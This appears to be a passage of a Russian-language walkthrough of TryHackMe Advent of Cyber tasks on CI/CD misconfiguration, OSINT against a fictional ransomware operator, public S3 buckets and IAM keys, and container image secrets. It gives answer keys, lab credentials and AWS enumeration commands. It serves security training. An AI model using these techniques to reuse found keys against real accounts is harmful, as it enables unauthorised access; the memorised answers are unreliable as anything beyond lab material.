часто встречаются в автоматизации CI / CD . Локально установленное приложение Jenkins может иметь неисправленный 
компонент, развернутый по различным эксплуатационным причинам. Однако редко бывает, чтобы критическая уязвимость 
оставалась неисправленной в течение длительного периода времени в инфраструктуре, управляемой поставщиком облачных 
услуг, таким как Amazon, Azure или Google. Это основная причина, по которой вы чаще будете видеть уязвимости, 
являющиеся результатом неправильного управления доступом, слабых привилегий учетной записи или логических ошибок.     

В приведенном выше примере мы увидели:
- Слишком слабые права доступа к папкам : пользователь McSkidy с низкими привилегиями мог записывать данные в папку 
«Добыча» Гринча.
- Права доступа к файлам были настроены неправильно:  пользователь McSkidy с низкими привилегиями мог изменить 
  содержимое скрипта loot.sh.
- Неправильная защита ключа:  В этом примере пароль Гринча можно рассматривать как секретный ключ, используемый для 
  соединения компонентов CI / CD . Если ключ можно прочитать из файла конфигурации, злоумышленник может повторно 
  использовать этот ключ в своих интересах. 
- Установка не была безопасной:  cronjobs регулярно запускали задачи без какого-либо контроля за несанкционированными 
  изменениями. Как вы могли прочитать в новостях сектора, аналогичное отсутствие контроля привело к выпуску 
  программного обеспечения с бэкдором. 
### Ответить на вопросы ниже
Сколько страниц обнаружило сканирование dirb с помощью списка слов по умолчанию?
```commandline
4
```
Сколько скриптов вы видите в папке /home/thegrinch/scripts?
```commandline
4
```
Какие пять символов следуют за $6$G в хэше пароля Pepper?
```commandline
ZUP42
```
Каково содержимое файла flag.txt на рабочем столе пользователя Гринча?
```commandline
DI3H4rdIsTheBestX-masMovie!
```

## Задание 20
МакСкиди измотана, ведь победить Гринча — это тяжелая работа! Она вспоминает свои ранние дни, когда решает, какую 
киберкарьеру выбрать. К счастью для МакСкиди, Гринч сегодня взял выходной, что дает вам время подумать, какую 
карьеру вы хотели бы выбрать после спасения Рождества.  

Откройте сайт, прикрепленный к этому заданию, и пройдите тест, чтобы узнать больше о различных профессиях в сфере 
кибербезопасности! 

Прочитайте эти истории успеха и узнайте, как TryHackMe помог людям построить карьеру в кибериндустрии:
- Брэндон — Получение карьеры в сфере безопасности сразу после университета
- Пол - От строителя до инженера по безопасности
- Кассандра - Учитель становится учеником, от школьного учителя до специалиста по безопасности
- Кенни — от ИТ-менеджера до аналитика по безопасности


На сегодня видео нет.

### Ответить на вопросы ниже
Пройдите тест и расскажите, какую карьеру в сфере кибербезопасности вам порекомендовали в Twitter, LinkedIn, 
Instagram или Facebook! 
```commandline
Ответ не нужен
```
Зарегистрируйтесь на образовательный путь TryHackMe, который был показан в викторине по карьере!
```commandline
Ответ не нужен
```
## Задание 21
### История

Grinch Enterprises решила использовать лучшую фестивальную компанию, чтобы опробовать свой новый сервис 
программ-вымогателей. Хотя они считают, что это отличный испытательный полигон, McSkidy непреклонен в определении 
своих целей и предоставлении их более широкому сообществу безопасности - можете ли вы использовать свои методы 
разведки с открытым исходным кодом, чтобы узнать больше информации об их банде программ-вымогателей!

Посмотрите видео-обучение Alh4zr3d на 16-й день здесь

### Цели обучения

- Понимание того, что такое OSINT и откуда он берёт своё начало
- Понять значение OSINT и то, как его можно использовать для разведки и сбора информации.
- Узнайте, как проводить расследование OSINT для сбора информации о человеке
### OSINT и цифровой след
OSINT означает Open Source Intelligence (разведка с открытым исходным кодом), информацию, которую можно получить из 
бесплатных и общедоступных источников. Наступательные группы обычно используют OSINT для проведения разведки цели, 
отдельного лица или корпорации. Агентства и правоохранительные органы также могут использовать OSINT для сбора 
информации.   

OSINT может показаться пугающим на первый взгляд; где я могу найти эту информацию? Не попаду ли я в неприятности? Не 
нужно беспокоиться; большинство операций OSINT просты и выполняются с использованием инструментов, с которыми вы уже 
знакомы в Clearnet.

OSINT — это обширный термин. Это всеобъемлющий термин многих различных дисциплин разведки; однако в этой задаче мы 
рассмотрим тему так, как она обычно известна. Информация лежит в основе OSINT ; информация обычно находится в двух 
местах,  

Clearnet: это относится ко всему, к чему вы можете получить публичный доступ из вашего традиционного веб-браузера, 
включая: 
Фейсбук
Твиттер
GitHub
Darknet: Доступ к darknet осуществляется с помощью специального программного обеспечения и требует дополнительной 
настройки; чаще всего его используют люди, заботящиеся о конфиденциальности, осведомители, цензурированные люди, 
преступники, журналисты и государственные правоохранительные органы. Ниже приведены несколько примеров того, что 
может предложить darknet,   
ТОР
Фринет
I2P
ИПФС
Зеронет
В этой задаче мы сосредоточимся на том, как мы можем использовать клиренс в наших интересах для сбора информации по 
указанной цели. Клиренс используется чаще из-за огромного количества общедоступных данных.

Информация, используемая в OSINT, берется из вашего цифрового следа. Это может показаться «модным» словом, но это 
ключ к тому, почему OSINT может быть полезным. При проведении OSINT мы смотрим, какие данные цель оставила, чтобы 
привести нас к информации/цели, которую мы ищем.  

### Цикл процесса OSINT
При проведении расследования OSINT у каждого человека и команды будет своя методология для подхода к задаче. Подход 
к OSINT может быть количественно определен с помощью моделей и систематических шагов, которым нужно следовать. Мы 
кратко рассмотрим две информационные модели RIS OSINT из этой исследовательской работы.

Модель данных и информации RIS OSINT описывает подход к сбору информации для идентификации и категоризации данных.

Интеллект получается из информации, которая получена из данных. Интеллект в конечном итоге приведет вас или вашего 
клиента к решению. Это решение определит, куда в следующей модели вы будете двигаться.

RIS OSINT Roller Coaster описывает фазы расследования OSINT, сосредоточенного вокруг клиента. Это постоянно 
развивающийся процесс, который будет меняться и продолжаться в зависимости от разведданных и решений предыдущей модели. 

### Обнаружение и анализ аккаунтов

Аккаунты являются распространенной и хорошо известной частью следа цели. Аккаунты могут включать любые публичные 
аккаунты, связанные с целью или целевой персоной, включая, помимо прочего, Facebook, Twitter, Reddit и т. д.

При анализе аккаунта цели мы обычно рассматриваем следующие цели:

Обнаружение учетной записи может быть затруднено в зависимости от цифрового следа объекта и от того, на каком этапе 
процесса OSINT вы находитесь.

### Google Доркинг
Чтобы начать поиск информации, нам нужно сначала индексировать и быстро находить эти источники. К счастью для нас, 
Google — наш лучший друг; к сожалению, простой поиск в Google не обязательно даст нам то, что мы хотим, или не будет 
таким подробным, как нам хотелось бы. У Google есть известная функция под названием «google dorks», которая позволит 
вам использовать определенный синтаксис в поисковом запросе для дальнейшей фильтрации и сделать ваш поиск более 
подробным.

Google предлагает определенный список ключевых терминов, которые мы можем использовать для достижения наших целей. 
Ниже приведен небольшой список возможных ключевых терминов, полный список терминов google dork можно найти здесь или 
здесь.  

### OSINT и блокчейн

С появлением Web 3.0, децентрализованного веб-протокола, находящегося в зачаточном состоянии, и ростом 
популярности криптовалют, OSINT с точки зрения технологии блокчейн  и децентрализации становится все более важным. 
Основным принципом технологии блокчейн и децентрализации является анонимность. Как можно собрать информацию о цели, 
если она анонимна?   

Технология блокчейн полностью открыта, оставаясь при этом анонимной; это имеет свои плюсы и минусы с точки зрения 
OSINT ; мы можем быстро идентифицировать конкретные идентификаторы, но их связывание может стать сложным. Множество 
инструментов помогают исследовать блокчейн, включая, но не ограничиваясь,

Блоктрейл
Кто есть кто в мире биткоинов
Графсенс
Блок-проводник
Мы можем применить ту же методологию, которая ранее обсуждалась, к технологии блокчейн. Хотя идентификаторы могут 
быть анонимными, это не делает их менее уникальными или невозможными для привязки к персонам. Когда мы сталкиваемся 
с технологией блокчейн, наша конечная цель — вернуться к традиционной персоне. Этот процесс может измениться по мере 
изменения сети, но пока останется прежним с текущей технологией.   

Цели и методологии будут меняться по мере изменения и адаптации децентрализации и технологии блокчейна. Примеры 
этого уже можно увидеть в большинстве криптовалютных кошельков, которые меняют адреса и обеспечивают надлежащие меры 
безопасности и конфиденциальности.  

### Двигаясь глубже

По своей сути OSINT — это поиск и идентификация информации. Однако нам также нужно рассмотреть, как мы можем 
использовать функциональность платформы в своих интересах, чтобы получить дополнительную информацию и ссылки, 
которые все еще могут быть общедоступными, но их нелегко найти.

Каждая платформа будет иметь свою уникальную функциональность и «трюки», которые можно использовать. Важно 
ознакомиться со всеми этими платформами и понять их плюсы и минусы. В этой задаче мы сосредоточимся конкретно на 
GitHub и некоторых способах, которыми люди могут не защищать свою личную информацию должным образом.   

Ранее мы обсуждали идею просмотра истории пользователя для идентификации информации. На первый взгляд может 
показаться, что у GitHub нет истории, которую мы могли бы использовать, но это действительно так. Контроль версий 
имеет решающее значение для работы GitHub, но он может привести к потенциальным утечкам информации, если не будет 
должным образом очищен или отслежен.   

Примером непреднамеренной утечки информации из GitHub может быть компания, которая забыла удалить свои ключи API из 
файла JSON. Они сделали новый коммит в своем репозитории, думая, что никто больше не сможет получить доступ к этим 
ключам. Любой может просмотреть историю коммитов публичного репозитория и увидеть, что именно было удалено и 
добавлено в репозиторий.   

### Составление расследования

Самая сложная часть расследования OSINT может заключаться в том, чтобы начать и собрать все части вместе. Не стоит 
беспокоиться; вам почти всегда дадут отправную точку или какую-то форму ссылки, с которой можно начать. При попытке 
собрать части расследования вместе важно помнить, что не все может иметь связь, и может быть несколько частей, 
которые связаны друг с другом, не сосредотачивайтесь слишком сильно на чем-то одном, а сосредоточьтесь на создании 
более общей персоны и понимании того, на что или на кого вы нацелились.    

### Ответить на вопросы ниже

Вы — офицер разведки, который охотится за дополнительной информацией о печально известной банде вымогателей «Grinch 
Enterprises».  
В ответ на недавнюю активность вымогателей от Grinch Enterprises вашей команде удалось собрать образец записки 
вымогателя.  

Ваши файлы были зашифрованы Гринчем. Мы используем самые современные технологии шифрования.
Чтобы получить доступ к своим файлам, обратитесь к оператору Grinch Enterprises.
Ваш личный идентификационный идентификатор: «b288b97e-665d-4105-a3b2-666da90db14b».
С оператором, назначенным для вашего дела, можно связаться как "GrinchWho31" на всех платформах.

```commandline
Ответ не нужен
```
Какое имя пользователя у оператора?
```commandline
GrinchWho31
```
С какой социальной сетью связано имя пользователя?
```commandline
Twitter
```
Какой криптографический идентификатор связан с оператором?
```commandline
1GW8QR7CWW3cpvVPGMCF5tZz4j96ncEgrVaR
```
С какой платформой связан криптографический идентификатор?
```commandline
keybase.io
```
Какой биткойн-адрес у оператора?
```commandline
bc1q5q2w2x6yka5gchr89988p2c8w8nquem6tndw2f
```
На какой платформе оператор раскрывает адрес биткоина? 
```commandline
GitHub
```
Какой личный адрес электронной почты у оператора?
```commandline
DonteHeath21@gmail.com
```
Каково настоящее имя оператора?
```commandline
Donte Heath
```

## Задание 22
В попытке поиздеваться над Best Festival Company Grinch Enterprises рассылает электронное письмо по всей компании с 
указанием имени и даты рождения каждого. МакСкиди выглядит весьма напряженной из-за нарушения и думает о возможных 
правовых последствиях. Она разговаривает с МакИнфрой, чтобы попытаться определить источник нарушения.

Посмотрите видео-обучение Нила Бриджа на 17-й день здесь

### Теневые ИТ
Иногда бизнес-подразделения обходят корпоративные ИТ, закупки, юридические и охранные службы, когда им нужно быстро 
выполнить работу. Это приводит к тому, что службы безопасности не знают, что им нужно защищать, а системы не 
соответствуют стандартам ИТ или безопасности.


Публичное облако — это простой способ для бизнес-подразделений заняться теневыми ИТ. И самое доступное публичное 
облако для начала работы — это AWS.

В чем разница между этими двумя изображениями? (Подсказка: щелкните правой кнопкой мыши и посмотрите на адреса 
изображений) 

Одна из них — внешняя ссылка из Amazon S3 Bucket. 

### Начиная
Вам нужно будет запустить AttackBox, чтобы запустить команды с использованием AWS CLI для сегодняшнего урока. Вашей 
целью будет учетная запись AWS и некоторые ресурсы, размещенные TryHackMe для Advent of Cyber этого года. 

Обратите внимание:  если вы используете бесплатный план TryHackMe, у атакующего устройства нет доступа в Интернет и 
оно не может подключиться к AWS . Вам нужно будет установить curl и AWS CLI на свой компьютер, чтобы выполнить это 
задание. Инструкции по установке AWS CLI здесь:  https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html  

### Цель обучения на сегодня
Сегодня мы рассмотрим основы AWS — одного из ведущих поставщиков публичных облачных услуг, а также два его самых 
распространенных сервиса —  Amazon S3 (Simple Storage Service)  и  AWS IAM (Identity and Access Management ).  


Мы покажем вам, как начать работу с AWS CLI, затем расскажем, как обнаружить публичные бакеты S3, посмотрим, что 
внутри. Мы также рассмотрим, как можно использовать ключ и секрет доступа IAM.

### Амазон AWS
Amazon AWS — поставщик услуг публичного облака. Согласно последним финансовым отчетам, AWS обеспечивает большую 
часть прибыли Amazon. Большинство крупных предприятий используют AWS в той или иной форме для вычислительных 
сервисов, больших данных или машинного обучения, архивации данных, потоковой передачи видео, Интернета вещей и т. д. 
Количество поддерживаемых AWS сервисов настолько велико, что мы едва можем вместить их все на этом снимке экрана.    


Ваши глаза вас не обманывают. Вы можете получить доступ к роботам, блокчейну, спутникам и квантовым вычислениям из AWS. 


AWS делит свою инфраструктуру на регионы , в основном независимые кластеры центров обработки данных. Внутри каждого 
региона есть зоны доступности (AZ). Каждая AZ в регионе использует отдельные электросети и обычно расположена в 
разных поймах рек. Такая избыточность позволяет вам создавать высокоустойчивые архитектуры, способные выдерживать 
значительные погодные или геологические явления, или, что более часто, отказы оборудования или объектов.    


Поскольку регионы независимы, вы получите разные ответы на вопросы в зависимости от региона, который вы запрашиваете.
Вы можете указать регион с помощью опции в AWS CLI . --region  


Доступ к AWS можно получить через AWS Console, AWS CLI, AWS API или соответствующие SDK для ваших любимых языков 
программирования.  


### Амазон S3
Amazon S3  (Simple Storage Service) — это их размещенный сервис хранения объектов. Объекты хранятся в Buckets. Чтобы 
максимально упростить концепцию хранения объектов, Buckets — это хранилища ключей и значений, где ключ объекта — это 
полное имя пути к файлу, а значение — содержимое файла. S3 — это публично размещенный сервис — он не находится за 
корпоративным брандмауэром, что делает его удобным для размещения публичного контента. AWS имеет целый набор функций 
для  размещения публичного веб-сайта в S3.

AWS Buckets используют глобальное пространство имен. Только один клиент AWS может создать bucket с именем .  
bestfestivalcompany-images 

Amazon S3 используется не только для публичного хостинга. Он имеет множество применений для архивирования данных, 
обработки видео, хранения нормативных записей и т. д. Проблема для Best Festival Company, как и для любого 
предприятия, использующего S3, заключается в том, что иногда данные путаются, и данные, которые не должны быть 
публичными, становятся публичными.   

### Обнаружение названий сегментов
Есть много способов узнать названия Buckets. Один из самых простых способов — когда компания встраивает контент, 
размещенный в S3, на свой веб-сайт. Изображения, PDF-файлы и т. д. можно недорого разместить в S3 и ссылаться на них 
с другого сайта. Эти ссылки будут выглядеть так:   

http://BUCKETNAME.s3.amazonaws.com/FILENAME.ext 

или

http://s3.amazonaws.com/BUCKETNAME/FILENAME.ext

В обоих случаях легко определить имя контейнера S3. Что же нам теперь делать с этой информацией?

Перечисление содержимого ведер
Amazon S3 — один из старейших сервисов AWS. Он настолько старый, что имеет два разных метода контроля доступа:  
Bucket Policies и S3 ACLs. Это приводит к большой путанице для разработчиков, которые должны управлять политиками,
ACLs и различиями между Any User и Authenticated Users.   


Многие бакеты, содержащие публичную информацию, позволяют вам перечислить содержимое бакета. В вашем AttackBox 
попробуйте выполнить команду:  

curl http://irs-form-990.s3.amazonaws.com/

Эта огромная куча XML -данных  представляет собой список всех деклараций IRS Form 990 для корпораций США, 
освобожденных от налогов. AWS предоставляет эти данные в виде  общедоступного набора данных. 


Если вам не по душе мысленный анализ XML-файлов, не содержащих переносов строк, AWS CLI также предоставляет 
возможность вывести список содержимого контейнера (вероятно, через несколько секунд вы захотите нажать Ctrl-C, так 
как в США много некоммерческих организаций).   

aws s3 ls s3://irs-form-990/ --no-sign-request



Опция --no-sign-request позволяет вам запрашивать данные из S3, не будучи клиентом AWS . 

Загрузка объектов
Загрузка объекта из S3 также проста. Вы можете использовать curl:

curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml

или AWS CLI :

aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request

Обратите внимание на два разных URI для объекта. К объектам можно обращаться с помощью http:// или через s3://



Различные уровни аутентификации Amazon S3
В Amazon S3 разрешения объектов отличаются от разрешений контейнеров. Разрешения контейнеров позволяют вам 
перечислять объекты в контейнере, в то время как разрешения объектов позволят вам загружать объект. В случае 
контейнера irs-form-990 и контейнер, и все объекты в контейнере доступны для чтения. Но это не обязательно так. 
Объекты могут быть доступны для чтения, а контейнер — нет, или контейнер может быть доступен для чтения, а объекты — 
нет.     


Примечание: вы также можете иметь публичные разрешения на запись в Bucket. Это, как правило, плохая идея и стало 
вектором нескольких  инцидентов с криптомайнингом.  


Также есть два уровня публичных контейнеров и объектов. Первый уровень — «Любой». Это то, что вы видели с 
контейнером irs-form-990. Вы можете просто нажать на этот URL из своего локального браузера. Второй уровень такой же 
публичный — и он публичен для  Любого клиента  AWS (которого AWS глупо называла  AuthenticatedUsers  в течение 
многих лет). Любой, у кого есть кредитная карта, может создать учетную запись AWS; поэтому Authenticated Users не 
обеспечивает особой защиты данных.    


За исключением нескольких старых сервисов, таких как Amazon S3, все запросы к сервисам AWS должны быть подписаны. 
Обычно это делается за кулисами с помощью AWS CLI или различных комплектов разработки ПО, предоставляемых AWS. 
Процесс подписания использует ключи доступа IAM. Эти ключи доступа являются одним из основных способов компрометации 
аккаунта AWS.   


### Ключи доступа IAM 

Ключи доступа IAM состоят из идентификатора ключа доступа и секретного ключа доступа. 


Идентификаторы ключей доступа всегда начинаются с букв AKIA и имеют длину 20 символов. Они действуют как имя 
пользователя для API AWS. Секретный ключ доступа имеет длину 40 символов. AWS генерирует обе строки; однако AWS не 
делает секретный ключ доступа доступным для загрузки после первоначальной генерации.   


Существует еще один тип учетных данных — краткосрочные учетные данные, в которых идентификатор ключа доступа 
начинается с букв ASIA и включает дополнительную строку, называемую токеном сеанса.  

Проведение разведки с помощью IAM
Когда вы найдете учетные данные для AWS , вы можете добавить их в свой  профиль AWS  в AWS CLI . Для этого 
используйте команду: 

`aws configure --profile PROFILENAME`


Эта команда добавит записи в .aws/config и .aws/credentials файлы в домашнем каталоге вашего пользователя. 


После настройки нового профиля с новыми ключами доступа вы можете выполнить любую команду, используя этот другой 
набор учетных данных. Например, чтобы вывести список всех S3 Buckets в учетной записи AWS , для которой вы нашли 
учетные данные, попробуйте:  

aws s3 ls --profile PROFILENAME


ProTip: Никогда не храните набор ключей доступа в профиле [default]. Это заставит вас всегда указывать профиль и 
никогда случайно не запускать команду против учетной записи, которую вы не собираетесь запускать.  


Вот еще несколько распространенных методов разведки AWS :

Поиск идентификатора учетной записи, принадлежащего ключу доступа:

aws sts get-access-key-info --access-key-id AKIAEXAMPLE 

Определение имени пользователя, которому принадлежит используемый вами ключ доступа

aws sts get-caller-identity --profile PROFILENAME

Список всех экземпляров EC2 , запущенных в учетной записи

aws ec2 describe-instances --output text --profile PROFILENAME

Список всех экземпляров EC2 , запущенных в учетной записи в другом регионе
aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME
AWS ARN

Amazon ARN — это их способ создания уникального идентификатора для всех ресурсов в облаке AWS . Он состоит из 
нескольких строк, разделенных двоеточиями. 

Формат:

arn:aws:<service>:<region>:<account_id>:<resource_type>/<resource_name>

### Испытание
Каким-то образом Гринчу удалось заполучить имена и адреса электронной почты всех эльфов. Как это могло произойти? 
Учитывая масштаб утечки, Макскиди считает, что в этом замешан кто-то из HR. Вы знаете, что HR недавно запустил новый 
сайт-портал с использованием WordPress. Вы также знаете, что HR не запрашивал у ИТ-отдела никакой инфраструктуры для 
развертывания этого сайта-портала. Где размещен этот портал?   



Вот изображение, которое HR разослал, анонсируя новый сайт:
Исходя из этого, можете ли вы выяснить, как Гринч получил доступ к базе данных сотрудников?

### Ответить на вопросы ниже
Как называется сегмент S3, используемый для размещения объявления на веб-сайте отдела кадров?

```commandline
images.bestfestivalcompany.com
```
Какое сообщение осталось в объекте flag.txt из этого контейнера?
```commandline
It's easy to get your elves data when you leave it so easy to find!
```
Какой еще файл в этой корзине показался вам интересным?
```commandline
wp-backup.zip
```
Какой идентификатор ключа доступа AWS содержится в этом файле?
```commandline
AKIAQI52OJVCPZXFYAOI
```
Для какого идентификатора аккаунта AWS работает ключ доступа?
```commandline
019181489476
```
Какое имя пользователя у этого ключа доступа?
```commandline
ElfMcHR@bfc.com
```
В этой учетной записи есть экземпляр EC2. Какое имя у экземпляра в разделе TAG?
```commandline
HR-Portal
```
Какой пароль базы данных хранится в Secrets Manager?
```commandline
Winter2021!
```

## Задание 23
Please note: If you are on the TryHackMe free plan, the attack box does not have internet access and cannot reach 
AWS. You will need to install curl and the AWS CLI on your own machine in order to complete this challenge. 
Instructions for installing the AWS CLI are here: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html  

Посмотрите видео-обучение Джона Хаммонда на 18-й день здесь

### Помещение
Grinch Enterprises злорадствовали по поводу своей атаки на подпольном форуме. Мы знаем, что они специально 
нацелились на организации в кампании, которую они назвали «Advent of Cyber» (AOC) — какое досадное совпадение. 
Отслеживая пользователя во времени, мы также обнаружили ссылку на использование AWS Elastic Container Registry (ECR) 
для хранения образов контейнеров, которые они используют в качестве инфраструктуры в своих атаках. Давайте посмотрим,
сможем ли мы узнать больше об инструментах для атак, которые использует Grinch Enterprises.

### Начиная
Вам нужно будет запустить AttackBox, чтобы выполнять команды с помощью инструмента контейнера Docker. Контейнеры — 
это механизм виртуализации, похожий на виртуальные машины (ВМ), а образы контейнеров основаны на спецификации Open 
Container Initiative Distribution. Однако, когда кто-то говорит о «Docker» или «контейнерах», они часто говорят о 
нескольких технологиях контейнеров, которые работают вместе. В частности, термин «Docker» используется для описания:

Docker API — локальный интерфейс связи на настроенной машине Linux со стандартизированными командами, используемыми 
для связи с Docker Daemon. 
Docker Daemon — процесс, который выполняется на вашем компьютере (Docker daemon) для взаимодействия с компонентами 
контейнера, такими как образы, тома данных и другие артефакты контейнера. 
Формат образа контейнера Docker — в конечном итоге файл .tar. Для версии 1 формат образа docker не был строго 
совместим со спецификацией образа OCI. Для наших целей это не изменит то, как мы взаимодействуем с образами 
контейнеров в этом упражнении, но это немного изменит формат и содержимое образа контейнера.  
Теперь, когда мы разобрались с некоторыми основными терминами, давайте приступим к сегодняшней учебной цели.

Цель сегодняшнего обучения — AWS Elastic Container Registry — ECR Public Gallery
Сегодня мы рассмотрим основы образов контейнеров и AWS Elastic Container Registry (ECR) — онлайн-реестра для 
публичных и частных образов контейнеров. Мы узнаем, как извлечь образ контейнера из онлайн-реестра и проверить 
элементы этого образа контейнера, чтобы выявить потенциальные проблемы безопасности.  

Образы Docker и реестр контейнеров Amazon Elastic
В вычислительной среде, основанной на облаке, контейнеры являются решением первого выбора для развертывания 
инфраструктуры. Подобно виртуальным машинам, контейнеры служат вычислительной фабрикой для многих запущенных приложений и размещенных процессов в облаке. 

После входа в AttackBox вы можете выполнить следующую команду, чтобы увидеть образы контейнеров, которые по 
умолчанию хранятся в вашем AttackBox: 

`docker images`

который должен вернуть вывод, аналогичный следующему:

Образы Докера
```commandline
root@ip-10-10-20-249:~# docker images
REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE
remnux/ciphey        latest              ec11b47184f6        9 months ago        177MB
rustscan/rustscan    2.0.0               6890f34e17b0        12 months ago       41.6MB
bcsecurity/empire    v3.5.2              cbd0b10f7f55        13 months ago       2.05GB
mpepping/cyberchef   latest              36979d2c2b9e        17 months ago       639MB
root@ip-10-10-20-249:~#
```
Контейнеры Docker хранятся в «репозиториях», которые являются ссылками на сопоставления файлов, к которым демон 
Docker знает, как получить доступ, включая файлы .tar контейнера. Каждое изображение в репозитории будет включать 
тег изображения, и на изображения можно ссылаться, используя либо их тег, либо идентификатор изображения.  

Например:

`remnux/ciphy:latest`

или

`ec11b47184f6`

Инфраструктура атаки Grinch Enterprise
Мы проследили инфраструктуру атаки Grinch Enterprises до вероятного реестра контейнеров Elastic, который находится 
в открытом доступе: 


Ссылка на предполагаемую галерею общедоступных контейнеров AWS для Grinch Enterprises

Вы можете получить потенциальный образ Grinch Enterprises, выполнив следующую команду на AttackBox:
`docker pull public.ecr.aws/h0w1j9u3/grinch-aoc:latest`
который возвращает вернет вывод, аналогичный следующему:

Докер Тянет
```commandline
root@ip-10-10-20-249:~# docker pull public.ecr.aws/h0w1j9u3/grinch-aoc:latest
latest: Pulling from h0w1j9u3/grinch-aoc
7b1a6ab2e44d: Pull complete 
7181c3c4941b: Pull complete 
148b30b9ae2d: Pull complete 
6f5a7c388565: Pull complete 
ef099323cb4a: Pull complete 
de5bf7e2abf0: Pull complete 
455d5424d859: Pull complete 
b1ee65a7e02a: Pull complete 
a47021107475: Pull complete 
Digest: sha256:593c79eaaa1a905c533e389b0034022e074969da3936df648172c4efc8d421d8
Status: Downloaded newer image for public.ecr.aws/h0w1j9u3/grinch-aoc:latest
public.ecr.aws/h0w1j9u3/grinch-aoc:latest
root@ip-10-10-20-249:~#
```
Вы можете запустить контейнер и взаимодействовать с ним, выполнив следующую команду:

`docker run -it public.ecr.aws/h0w1j9u3/grinch-aoc:latest`
что откроет оболочку внутри изображения контейнера, как указано $. Оказавшись внутри контейнера, мы можем провести 
небольшую разведку: 

`ls -la`
что показывает, что в текущем рабочем каталоге нет обычных файлов или подкаталогов.

Докер Ран
```commandline
root@ip-10-10-20-249:~# docker run -it public.ecr.aws/h0w1j9u3/grinch-aoc:latest
$ ls -la
total 20
drwxr-xr-x 2 newuser newuser 4096 Oct 21 20:31 .
drwxr-xr-x 1 root    root    4096 Oct 21 20:31 ..
-rw-r--r-- 1 newuser newuser  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 newuser newuser 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 newuser newuser  807 Feb 25  2020 .profile
$
```
Спойлер
Следующим хорошим местом для проверки являются переменные среды. В Linux , особенно для контейнеров, переменные 
среды могут использоваться для хранения секретов или другой конфиденциальной информации, используемой для настройки 
контейнера во время выполнения.  

Поэтому мы пытаемся printenv узнать больше о конфигурациях среды, в которых мы видим:

```commandline
printenv
$ printenv
HOSTNAME=c633e29bb404
HOME=/home/newuser
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
api_key=a90eac086fd049ab9a08374f65d1e977
PWD=/home/newuser
$
```
и мы наткнулись на то, api_keyчто, как я предполагаю, Grinch Enterprises не собиралась оставлять позади.

### Бонусный вызов
Образ контейнера состоит из нескольких слоев — возможно, в базовом слое контейнера есть конфиденциальная информация, 
которую Grinch Enterprises не очистила в процессе сборки. Одной из основных причин, по которой разработчики (и 
злоумышленники) могут упаковать свое приложение (или инструменты атаки) в контейнер, является то, что контейнер 
позволяет разработчику «заморозить» приложение и его зависимости в образе в процессе сборки. Процесс сборки является 
частью жизненного цикла разработки программного обеспечения (SDLC), где приложения и их зависимости упаковываются 
вместе и тестируются перед распространением и использованием.

После создания образа запуск образа контейнера всегда будет приводить к тому же состоянию конфигурации, которое было 
указано во время сборки. Образы контейнеров создаются из исходного файла, известного как Dockerfile. Dockerfiles — 
это список инструкций, разделенных новой строкой, которые сообщают демону Docker, как сгенерировать образ контейнера.
Вы можете прочитать исчерпывающее объяснение того, как писать Dockerfiles, в справочнике Dockerfile. Вы можете 
увидеть пример Dockerfile здесь >. В случае Grinch Enterprises у нас нет исходного Dockerfile, но с образом 
контейнера у нас есть кое-что столь же хорошее. Давайте начнем с создания нового каталога и сохранения загруженного 
образа как файла .tar.

1. Создайте новый каталог:mkdir aoc
2. Измените каталог на только что созданный каталог:cd aoc
3. Сохраните образ контейнера как файл .tar:`docker save -o aoc.tar public.ecr.aws/h0w1j9u3/grinch-aoc:latest`

Докер Сохранить
```commandline
$ exit
root@ip-10-10-20-249:~# mkdir aoc
root@ip-10-10-20-249:~# cd aoc/
root@ip-10-10-20-249:~/aoc# docker save -o aoc.tar public.ecr.aws/h0w1j9u3/grinch-aoc:latest
root@ip-10-10-20-249:~/aoc#
```
После сохранения изображения мы можем дополнительно проверить его, распаковав сжатый файл.

`tar -xf aoc.tar`

Обратите внимание, что при выполнении команды я использовал опцию -v (подробный вывод), и вы можете видеть различные 
распаковываемые файлы: 

```commandline
root@ip-10-10-20-249:~/aoc# tar -xvf aoc.tar
40ad0e404f6065a153d1b4d42e8b315be3504a08c21fadd6e5fde5982b45df18/
40ad0e404f6065a153d1b4d42e8b315be3504a08c21fadd6e5fde5982b45df18/VERSION
40ad0e404f6065a153d1b4d42e8b315be3504a08c21fadd6e5fde5982b45df18/json
40ad0e404f6065a153d1b4d42e8b315be3504a08c21fadd6e5fde5982b45df18/layer.tar
4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682/
4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682/VERSION
4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682/json
4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682/layer.tar
4cc7bdb0ea56d31f57a373d0e7ce0d633ae86dc327087fccf103c8d97f0cc9c4/
4cc7bdb0ea56d31f57a373d0e7ce0d633ae86dc327087fccf103c8d97f0cc9c4/VERSION
4cc7bdb0ea56d31f57a373d0e7ce0d633ae86dc327087fccf103c8d97f0cc9c4/json
4cc7bdb0ea56d31f57a373d0e7ce0d633ae86dc327087fccf103c8d97f0cc9c4/layer.tar
4f62ae56d8d3b96d5fbe86da8a3f7bf6e9195d360b922cd7b162e17619c50664/
4f62ae56d8d3b96d5fbe86da8a3f7bf6e9195d360b922cd7b162e17619c50664/VERSION
4f62ae56d8d3b96d5fbe86da8a3f7bf6e9195d360b922cd7b162e17619c50664/json
4f62ae56d8d3b96d5fbe86da8a3f7bf6e9195d360b922cd7b162e17619c50664/layer.tar
619ddb982b75f0eb6c9f48624e6a0d20be227e893599d8dea05dbdddc8b14e2b/
619ddb982b75f0eb6c9f48624e6a0d20be227e893599d8dea05dbdddc8b14e2b/VERSION
619ddb982b75f0eb6c9f48624e6a0d20be227e893599d8dea05dbdddc8b14e2b/json
619ddb982b75f0eb6c9f48624e6a0d20be227e893599d8dea05dbdddc8b14e2b/layer.tar
9dedacd92213db743681db2e8d5b3247fd79ce266495d061a381c4c0441ce15d/
